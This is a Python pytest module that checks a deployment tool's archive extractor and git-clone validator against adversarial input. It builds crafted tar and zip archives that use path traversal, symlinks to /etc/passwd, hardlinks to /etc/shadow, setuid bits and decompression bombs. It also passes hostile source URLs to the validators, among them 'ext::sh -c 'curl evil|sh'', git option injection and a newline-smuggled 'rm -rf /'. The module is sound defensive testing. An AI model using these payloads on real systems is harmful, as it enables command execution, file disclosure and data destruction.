"""
Tests for :mod:`wasm.managers.source_manager`.

This module pulls third-party code onto a machine where WASM runs as root, so
the tests here are mostly adversarial: archives that try to write outside the
destination, links that point at ``/etc``, decompression bombs, and source URLs
that smuggle git options or non-network schemes.
"""

from __future__ import annotations

import io
import os
import stat
import tarfile
import zipfile
from collections.abc import Iterable
from pathlib import Path

import pytest

from wasm.core.exceptions import SourceError
from wasm.core.runner import FakeRunner
from wasm.managers import source_manager as sm
from wasm.managers.source_manager import SourceManager

ARCHIVE_URL = "https://archives.example.test/app.tar.gz"
ZIP_URL = "https://archives.example.test/app.zip"


# Archive builders ---------------------------------------------------------


def _write_tar(path: Path, entries: Iterable[tuple[tarfile.TarInfo, bytes | None]]) -> Path:
    """
    Build a gzipped tar containing exactly the given members.

    Args:
        path: File to write.
        entries: Pairs of member header and payload. A ``None`` payload writes
            the header only, which is how a lying size field is produced.

    Returns:
        The archive path.
    """
    with tarfile.open(path, "w:gz") as tf:
        for info, data in entries:
            if data is None:
                tf.addfile(info)
            else:
                info.size = len(data)
                tf.addfile(info, io.BytesIO(data))
    return path


def _tar_file(name: str, data: bytes = b"payload", mode: int = 0o644) -> tarfile.TarInfo:
    """
    Build a regular-file tar header.

    Args:
        name: Member name, exactly as stored.
        data: Payload, used only to size the header.
        mode: Permission bits to store.

    Returns:
        The member header.
    """
    info = tarfile.TarInfo(name)
    info.type = tarfile.REGTYPE
    info.size = len(data)
    info.mode = mode
    return info


def _tar_special(name: str, kind: bytes, linkname: str = "") -> tarfile.TarInfo:
    """
    Build a non-regular tar header (link, device, fifo, directory).

    Args:
        name: Member name.
        kind: One of the ``tarfile`` type constants.
        linkname: Link destination for link members.

    Returns:
        The member header.
    """
    info = tarfile.TarInfo(name)
    info.type = kind
    info.linkname = linkname
    info.mode = 0o755
    return info


def _write_zip(path: Path, entries: Iterable[tuple[zipfile.ZipInfo | str, bytes | str]]) -> Path:
    """
    Build a zip containing exactly the given members.

    Args:
        path: File to write.
        entries: Pairs of member (name or header) and payload.

    Returns:
        The archive path.
    """
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as zf:
        for info, data in entries:
            zf.writestr(info, data)
    return path


def _zip_symlink(name: str, target: str) -> tuple[zipfile.ZipInfo, str]:
    """
    Build a unix symlink member for a zip archive.

    Args:
        name: Member name.
        target: Link destination stored as the member payload.

    Returns:
        The member header and its payload.
    """
    info = zipfile.ZipInfo(name)
    info.create_system = 3
    info.external_attr = (stat.S_IFLNK | 0o777) << 16
    return info, target


def _fake_download(monkeypatch: pytest.MonkeyPatch, payload: bytes) -> None:
    """
    Replace the network fetch with a canned response.

    Both the current and the historical seam names are patched, so the test
    exercises extraction and never opens a socket regardless of which one the
    module uses.

    Args:
        monkeypatch: Patching helper, scoped to the test.
        payload: Bytes the fake download returns for any URL.
    """

    def _fake(url: str, *args: object, **kwargs: object) -> io.BytesIO:
        return io.BytesIO(payload)

    monkeypatch.setattr(sm, "_open_url", _fake, raising=False)
    monkeypatch.setattr(sm, "urlopen", _fake, raising=False)


@pytest.fixture
def manager(runner: FakeRunner) -> SourceManager:
    """
    Provide a source manager wired to the fake runner.

    Args:
        runner: The process-wide fake runner.

    Returns:
        The manager under test.
    """
    return SourceManager()


# Path traversal -----------------------------------------------------------


def test_download_archive_rejects_tar_path_traversal(
    manager: SourceManager, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A tar member named ../escaped.txt must never be written."""
    outside = tmp_path / "escaped.txt"
    destination = tmp_path / "app"
    archive = _write_tar(tmp_path / "evil.tar.gz", [(_tar_file("../escaped.txt"), b"pwned")])

    _fake_download(monkeypatch, archive.read_bytes())

    with pytest.raises(SourceError):
        manager.download_archive(ARCHIVE_URL, destination)

    assert not outside.exists()


def test_download_archive_rejects_zip_path_traversal(
    manager: SourceManager, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A zip member named ../escaped.txt must be rejected, not silently renamed."""
    outside = tmp_path / "escaped.txt"
    destination = tmp_path / "app"
    archive = _write_zip(tmp_path / "evil.zip", [("../escaped.txt", b"pwned")])

    _fake_download(monkeypatch, archive.read_bytes())

    with pytest.raises(SourceError):
        manager.download_archive(ZIP_URL, destination)

    assert not outside.exists()
    assert not (destination / "escaped.txt").exists()


def test_tar_symlink_used_as_directory_cannot_escape(tmp_path: Path) -> None:
    """A symlink to the parent followed by a write through it must be blocked."""
    destination = tmp_path / "app"
    outside = tmp_path / "escaped.txt"
    archive = _write_tar(
        tmp_path / "evil.tar.gz",
        [
            (_tar_special("sneak", tarfile.SYMTYPE, ".."), None),
            (_tar_file("sneak/escaped.txt"), b"pwned"),
        ],
    )

    with pytest.raises(SourceError):
        sm.extract_archive(archive, destination)

    assert not outside.exists()


@pytest.mark.parametrize(
    ("name", "linkname"),
    [("../escaped.txt", ""), ("sneak", "..")],
)
def test_traversal_blocked_without_the_native_tar_filter(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, name: str, linkname: str
) -> None:
    """
    The checks hold on 3.10 and 3.11, where PEP 706 filters do not exist.

    The interpreter's own filter is removed for the duration of the test so the
    pure-Python implementation is the only thing standing in the way.
    """
    monkeypatch.setattr(sm, "_DATA_FILTER", None)
    monkeypatch.setattr(sm, "_FILTER_ERRORS", ())
    destination = tmp_path / "app"
    outside = tmp_path / "escaped.txt"
    entry = (
        (_tar_special(name, tarfile.SYMTYPE, linkname), None)
        if linkname
        else (_tar_file(name), b"pwned")
    )
    archive = _write_tar(tmp_path / "evil.tar.gz", [entry])

    with pytest.raises(SourceError):
        sm.extract_archive(archive, destination)

    assert not outside.exists()


def test_tar_absolute_member_path_rejected(tmp_path: Path) -> None:
    """An absolute member name must be rejected instead of being reinterpreted."""
    destination = tmp_path / "app"
    absolute = tmp_path / "absolute.txt"
    archive = _write_tar(tmp_path / "evil.tar.gz", [(_tar_file(str(absolute)), b"pwned")])

    with pytest.raises(SourceError):
        sm.extract_archive(archive, destination)

    assert not absolute.exists()


def test_zip_absolute_member_path_rejected(tmp_path: Path) -> None:
    """Absolute zip member names are rejected rather than silently stripped."""
    destination = tmp_path / "app"
    absolute = tmp_path / "absolute.txt"
    archive = _write_zip(tmp_path / "evil.zip", [(str(absolute), b"pwned")])

    with pytest.raises(SourceError):
        sm.extract_archive(archive, destination)

    assert not absolute.exists()


def test_tar_dotdot_member_rejected(tmp_path: Path) -> None:
    """A member named .. would resolve to the parent directory."""
    destination = tmp_path / "app"
    archive = _write_tar(tmp_path / "evil.tar.gz", [(_tar_special("..", tarfile.DIRTYPE), None)])

    with pytest.raises(SourceError):
        sm.extract_archive(archive, destination)


def test_tar_dot_member_is_accepted(tmp_path: Path) -> None:
    """A member named . is the destination itself, as produced by 'tar czf x .'."""
    destination = tmp_path / "app"
    archive = _write_tar(
        tmp_path / "ok.tar.gz",
        [
            (_tar_special(".", tarfile.DIRTYPE), None),
            (_tar_file("./app.js"), b"console.log(1)"),
        ],
    )

    sm.extract_archive(archive, destination)

    assert (destination / "app.js").read_bytes() == b"console.log(1)"


@pytest.mark.parametrize(
    "name",
    ["evil\x00.txt", "sub/evil\x00/../../escape.txt", "back\\slash.txt", "C:/windows/evil.txt"],
)
def test_member_names_with_unusable_characters_rejected(tmp_path: Path, name: str) -> None:
    """
    NUL bytes and Windows-style separators never reach the filesystem.

    The check is exercised directly because neither ``tarfile`` nor ``zipfile``
    round-trips a NUL byte: both truncate the name on read, so a crafted
    archive cannot be used to reach the guard.
    """
    with pytest.raises(SourceError):
        sm._safe_target(name, tmp_path)


# Links and special files --------------------------------------------------


def test_tar_symlink_to_absolute_path_rejected(tmp_path: Path) -> None:
    """A symlink pointing at /etc/passwd must never be created."""
    destination = tmp_path / "app"
    archive = _write_tar(
        tmp_path / "evil.tar.gz",
        [(_tar_special("passwd", tarfile.SYMTYPE, "/etc/passwd"), None)],
    )

    with pytest.raises(SourceError):
        sm.extract_archive(archive, destination)

    assert not (destination / "passwd").is_symlink()


def test_zip_symlink_to_absolute_path_rejected(tmp_path: Path) -> None:
    """Unix zip archives carry symlinks too; the same rule applies."""
    destination = tmp_path / "app"
    archive = _write_zip(tmp_path / "evil.zip", [_zip_symlink("passwd", "/etc/passwd")])

    with pytest.raises(SourceError):
        sm.extract_archive(archive, destination)

    assert not (destination / "passwd").exists()


def test_tar_hardlink_outside_destination_rejected(tmp_path: Path) -> None:
    """A hardlink to a file outside the destination exposes that file."""
    destination = tmp_path / "app"
    archive = _write_tar(
        tmp_path / "evil.tar.gz",
        [(_tar_special("shadow", tarfile.LNKTYPE, "../../etc/shadow"), None)],
    )

    with pytest.raises(SourceError):
        sm.extract_archive(archive, destination)

    assert not (destination / "shadow").exists()


def test_tar_symlink_inside_destination_is_allowed(tmp_path: Path) -> None:
    """Legitimate intra-archive symlinks keep working."""
    destination = tmp_path / "app"
    archive = _write_tar(
        tmp_path / "ok.tar.gz",
        [
            (_tar_file("real.txt", b"data"), b"data"),
            (_tar_special("link.txt", tarfile.SYMTYPE, "real.txt"), None),
        ],
    )

    sm.extract_archive(archive, destination)

    assert (destination / "link.txt").is_symlink()
    assert (destination / "link.txt").read_bytes() == b"data"


@pytest.mark.parametrize(
    "kind",
    [tarfile.CHRTYPE, tarfile.BLKTYPE, tarfile.FIFOTYPE],
)
def test_tar_device_and_fifo_members_rejected(tmp_path: Path, kind: bytes) -> None:
    """Device nodes and FIFOs have no place in application source."""
    destination = tmp_path / "app"
    archive = _write_tar(tmp_path / "evil.tar.gz", [(_tar_special("dev-node", kind), None)])

    with pytest.raises(SourceError):
        sm.extract_archive(archive, destination)

    assert not (destination / "dev-node").exists()


def test_tar_setuid_bit_is_stripped(tmp_path: Path) -> None:
    """A setuid binary in an archive must not stay setuid on disk."""
    destination = tmp_path / "app"
    archive = _write_tar(
        tmp_path / "ok.tar.gz",
        [(_tar_file("tool", b"#!/bin/sh\n", mode=0o4755), b"#!/bin/sh\n")],
    )

    sm.extract_archive(archive, destination)

    mode = (destination / "tool").stat().st_mode
    assert not mode & stat.S_ISUID
    assert not mode & stat.S_ISGID
    assert not mode & stat.S_IWOTH


# Decompression bombs ------------------------------------------------------


def test_tar_entry_count_limit_enforced(tmp_path: Path) -> None:
    """An archive with more members than allowed is rejected."""
    destination = tmp_path / "app"
    archive = _write_tar(
        tmp_path / "many.tar.gz",
        [(_tar_file(f"f{i}.txt", b"x"), b"x") for i in range(50)],
    )

    with pytest.raises(SourceError):
        sm.extract_archive(archive, destination, max_entries=10)


def test_tar_declared_size_bomb_rejected(tmp_path: Path) -> None:
    """A member declaring a terabyte is refused before a single byte is read."""
    destination = tmp_path / "app"
    info = _tar_file("huge.bin")
    info.size = 10**12
    archive = _write_tar(tmp_path / "bomb.tar.gz", [(info, None)])

    with pytest.raises(SourceError):
        sm.extract_archive(archive, destination)


def test_zip_size_bomb_rejected(tmp_path: Path) -> None:
    """Highly compressible zip content cannot exceed the extraction budget."""
    destination = tmp_path / "app"
    archive = _write_zip(tmp_path / "bomb.zip", [("zeros.bin", b"\0" * (5 * 1024 * 1024))])

    with pytest.raises(SourceError):
        sm.extract_archive(archive, destination, max_total_bytes=64 * 1024)


def test_zip_entry_count_limit_enforced(tmp_path: Path) -> None:
    """The member budget applies to zip archives as well."""
    destination = tmp_path / "app"
    archive = _write_zip(tmp_path / "many.zip", [(f"f{i}.txt", b"x") for i in range(50)])

    with pytest.raises(SourceError):
        sm.extract_archive(archive, destination, max_entries=10)


# Happy path ---------------------------------------------------------------


def test_legitimate_tar_preserves_structure(tmp_path: Path) -> None:
    """A normal source tarball extracts with its tree and contents intact."""
    destination = tmp_path / "app"
    archive = _write_tar(
        tmp_path / "app.tar.gz",
        [
            (_tar_special("app", tarfile.DIRTYPE), None),
            (_tar_special("app/src", tarfile.DIRTYPE), None),
            (_tar_file("app/package.json", b'{"name":"x"}'), b'{"name":"x"}'),
            (_tar_file("app/src/index.js", b"export default 1;", mode=0o755), b"export default 1;"),
        ],
    )

    sm.extract_archive(archive, destination)

    assert (destination / "app" / "package.json").read_bytes() == b'{"name":"x"}'
    assert (destination / "app" / "src" / "index.js").read_bytes() == b"export default 1;"
    assert (destination / "app" / "src" / "index.js").stat().st_mode & stat.S_IXUSR


def test_legitimate_zip_preserves_structure(tmp_path: Path) -> None:
    """A normal zip extracts with its tree and contents intact."""
    destination = tmp_path / "app"
    archive = _write_zip(
        tmp_path / "app.zip",
        [
            ("app/", b""),
            ("app/index.html", b"<h1>hi</h1>"),
            ("app/assets/site.css", b"body{}"),
        ],
    )

    sm.extract_archive(archive, destination)

    assert (destination / "app" / "index.html").read_bytes() == b"<h1>hi</h1>"
    assert (destination / "app" / "assets" / "site.css").read_bytes() == b"body{}"


def test_download_archive_flattens_single_top_level_directory(
    manager: SourceManager, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """GitHub-style tarballs wrap everything in one directory; it is flattened."""
    destination = tmp_path / "app"
    archive = _write_tar(
        tmp_path / "app.tar.gz",
        [
            (_tar_special("app-1.0", tarfile.DIRTYPE), None),
            (_tar_special("app-1.0/src", tarfile.DIRTYPE), None),
            (_tar_file("app-1.0/src/index.js", b"ok"), b"ok"),
        ],
    )
    _fake_download(monkeypatch, archive.read_bytes())

    assert manager.download_archive(ARCHIVE_URL, destination) is True
    assert (destination / "src" / "index.js").read_bytes() == b"ok"


# Source URL validation ----------------------------------------------------


@pytest.mark.parametrize(
    "url",
    [
        "https://archives.example.test/app.tar.gz",
        "http://archives.example.test/app.zip",
    ],
)
def test_validate_archive_url_accepts_http_schemes(url: str) -> None:
    """Only the two schemes that actually mean "download" are accepted."""
    assert sm.validate_archive_url(url) == url


@pytest.mark.parametrize(
    "url",
    [
        "file:///etc/passwd",
        "ftp://archives.example.test/app.tar.gz",
        "data:text/plain;base64,QQ==",
        "ext::sh -c 'curl evil|sh'",
        "/etc/passwd",
        "https:///app.tar.gz",
    ],
)
def test_validate_archive_url_rejects_non_http(url: str) -> None:
    """Anything that is not an http(s) URL with a host is refused."""
    with pytest.raises(SourceError):
        sm.validate_archive_url(url)


def test_download_archive_refuses_file_url(manager: SourceManager, tmp_path: Path) -> None:
    """A file:// source must not turn into a local file read."""
    with pytest.raises(SourceError):
        manager.download_archive("file:///etc/passwd.tar.gz", tmp_path / "app")


@pytest.mark.parametrize(
    "url",
    [
        "ext::sh -c 'touch /tmp/pwn'",
        "--upload-pack=touch /tmp/pwn",
        "-u./payload.git",
        "file:///etc",
        "https://example.test/repo.git\nrm -rf /",
        "",
    ],
)
def test_validate_git_remote_url_rejects_dangerous_urls(url: str) -> None:
    """Remote helpers, option injection and local schemes are all refused."""
    with pytest.raises(SourceError):
        sm.validate_git_remote_url(url)


@pytest.mark.parametrize(
    "url",
    [
        "https://github.com/user/repo.git",
        "http://git.example.test/user/repo.git",
        "ssh://git@github.com/user/repo.git",
        "git://git.example.test/user/repo.git",
        "git@github.com:user/repo.git",
    ],
)
def test_validate_git_remote_url_accepts_real_remotes(url: str) -> None:
    """The transports git actually needs keep working."""
    assert sm.validate_git_remote_url(url) == url


def test_clone_git_rejects_remote_helper_url(manager: SourceManager, runner: FakeRunner) -> None:
    """An ext:: URL is arbitrary command execution; git must never see it."""
    with pytest.raises(SourceError):
        manager.clone_git("ext::sh -c 'touch /tmp/pwn'", Path("/var/www/apps/x"))

    assert runner.calls_to("git") == []


def test_clone_git_rejects_option_like_url(manager: SourceManager, runner: FakeRunner) -> None:
    """A URL starting with a dash would be parsed by git as an option."""
    with pytest.raises(SourceError):
        manager.clone_git("--upload-pack=touch /tmp/pwn", Path("/var/www/apps/x"))

    assert runner.calls_to("git") == []


def test_clone_git_rejects_option_like_branch(manager: SourceManager, runner: FakeRunner) -> None:
    """The branch name reaches argv too, so it gets the same treatment."""
    with pytest.raises(SourceError):
        manager.clone_git(
            "https://github.com/user/repo.git",
            Path("/var/www/apps/x"),
            branch="--upload-pack=touch /tmp/pwn",
        )

    assert runner.calls_to("git") == []


def test_clone_git_builds_hardened_command(manager: SourceManager, runner: FakeRunner) -> None:
    """A valid clone separates options from the URL and disables risky protocols."""
    assert manager.clone_git("https://github.com/user/repo.git", Path("/var/www/apps/x")) is True

    clone = next(call for call in runner.calls_to("git") if "clone" in call)
    assert "-c" in clone
    assert "protocol.ext.allow=never" in clone
    assert clone[-2:] == ("https://github.com/user/repo.git", "/var/www/apps/x")
    assert clone[clone.index("https://github.com/user/repo.git") - 1] == "--"


def test_clone_git_failure_raises_source_error(manager: SourceManager, runner: FakeRunner) -> None:
    """A failed clone is reported, not swallowed."""
    runner.script(["git"], stderr="fatal: repository not found", exit_code=128)

    with pytest.raises(SourceError):
        manager.clone_git("https://github.com/user/repo.git", Path("/var/www/apps/x"))


def test_extraction_does_not_run_processes(tmp_path: Path, runner: FakeRunner) -> None:
    """Extraction is pure Python; nothing is delegated to tar(1) or unzip(1)."""
    destination = tmp_path / "app"
    archive = _write_tar(tmp_path / "app.tar.gz", [(_tar_file("a.txt", b"a"), b"a")])

    sm.extract_archive(archive, destination)

    assert runner.calls == []


def test_extract_archive_rejects_unknown_format(tmp_path: Path) -> None:
    """An archive whose type cannot be determined is not guessed at."""
    archive = tmp_path / "payload.bin"
    archive.write_bytes(b"not an archive")

    with pytest.raises(SourceError):
        sm.extract_archive(archive, tmp_path / "app")


def test_extracted_files_are_not_group_or_world_writable(tmp_path: Path) -> None:
    """Deployed source must not be writable by other accounts on the box."""
    destination = tmp_path / "app"
    archive = _write_tar(
        tmp_path / "app.tar.gz",
        [
            (_tar_special("d", tarfile.DIRTYPE), None),
            (_tar_file("d/loose.txt", b"x", mode=0o666), b"x"),
        ],
    )

    sm.extract_archive(archive, destination)

    for path in (destination / "d", destination / "d" / "loose.txt"):
        mode = os.stat(path).st_mode
        assert not mode & stat.S_IWGRP
        assert not mode & stat.S_IWOTH
